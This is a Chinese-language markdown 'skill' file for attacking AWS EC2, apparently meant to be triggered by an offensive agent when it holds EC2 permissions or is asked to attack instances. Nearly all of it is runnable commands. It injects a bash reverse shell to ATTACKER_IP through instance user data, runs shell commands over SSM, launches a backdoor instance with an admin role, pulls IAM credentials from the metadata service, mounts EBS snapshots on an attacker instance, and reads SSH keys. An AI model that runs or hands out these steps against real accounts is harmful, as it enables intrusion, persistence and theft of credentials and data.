---
name: aws-ec2-attack
type: attack
category: compute-exploitation
platform: aws
severity: high
---

# AWS EC2 攻击技能

## 触发条件

- 有 AWS 凭证且有 EC2 权限
- 发现 ec2:* 权限
- 用户要求"攻击 EC2 实例"

## 前置检查

```bash
# 1. 列出 EC2 实例
aws ec2 describe-instances --query 'Reservations[].Instances[].{ID:InstanceId,Type:InstanceType,State:State.Name}'

# 2. 检查实例配置
aws ec2 describe-instance-attribute --instance-id i-xxxxxxxx --attribute userData
```

## 攻击方法

### 方法 1: 通过用户数据注入

```bash
# 1. 停止实例
aws ec2 stop-instances --instance-ids i-xxxxxxxx

# 2. 创建恶意用户数据
cat > user-data.sh <<'EOF'
#!/bin/bash
# 反向 Shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
EOF

# 3. 编码用户数据
base64 user-data.sh > user-data.txt

# 4. 修改用户数据
aws ec2 modify-instance-attribute --instance-id i-xxxxxxxx --user-data fileb://user-data.txt

# 5. 启动实例
aws ec2 start-instances --instance-ids i-xxxxxxxx

# 6. 监听连接
nc -lvnp 4444
```

### 方法 2: 通过 SSM 执行命令

```bash
# 1. 检查 SSM 可用性
aws ssm describe-instance-information --filters "Key=InstanceIds,Values=i-xxxxxxxx"

# 2. 执行命令
aws ssm send-command \
  --instance-ids i-xxxxxxxx \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["whoami","cat /etc/passwd"]'

# 3. 启动会话
aws ssm start-session --target i-xxxxxxxx

# 4. 在会话中执行命令
# 直接在 shell 中操作
```

### 方法 3: 创建后门实例

```bash
# 1. 创建密钥对
aws ec2 create-key-pair --key-name backdoor-key --query 'KeyMaterial' --output text > backdoor.pem
chmod 400 backdoor.pem

# 2. 启动高权限实例
aws ec2 run-instances \
  --image-id ami-xxxxxxxx \
  --instance-type t2.micro \
  --key-name backdoor-key \
  --iam-instance-profile Name=AdminRole \
  --user-data fileb://user-data.sh

# 3. 获取实例 IP
INSTANCE_IP=$(aws ec2 describe-instances \
  --filters "Name=image-id,Values=ami-xxxxxxxx" \
  --query 'Reservations[0].Instances[0].PublicIpAddress' \
  --output text)

# 4. SSH 连接
ssh -i backdoor.pem ubuntu@$INSTANCE_IP

# 5. 获取元数据凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 方法 4: EBS 快照攻击

```bash
# 1. 列出快照
aws ec2 describe-snapshots --owner-alias self

# 2. 创建卷从快照
VOLUME_ID=$(aws ec2 create-volume \
  --snapshot-id snap-xxxxxxxx \
  --availability-zone us-east-1a \
  --query 'VolumeId' --output text)

# 3. 附加到攻击者实例
aws ec2 attach-volume \
  --volume-id $VOLUME_ID \
  --instance-id attacker-instance \
  --device /dev/sdf

# 4. 在实例上挂载
ssh attacker-instance
sudo mkdir /mnt/data
sudo mount /dev/sdf /mnt/data

# 5. 读取数据
sudo ls -la /mnt/data
```

### 方法 5: 窃取实例密钥对

```bash
# 1. 通过用户数据或 SSM 获取
aws ssm send-command \
  --instance-ids i-xxxxxxxx \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["cat /home/ubuntu/.ssh/authorized_keys"]'

# 2. 或通过快照挂载读取
sudo cat /mnt/home/ubuntu/.ssh/id_rsa
```

## 验证成功

```bash
# 成功获取 Shell
# 在 nc 或 SSH 中

# 成功读取数据
ls /mnt/data

# 成功获取凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## 下一步

1. aws-metadata-attack - 获取实例凭证
2. aws-lambda-attack - 攻击 Lambda
3. aws-persistence - 建立持久化
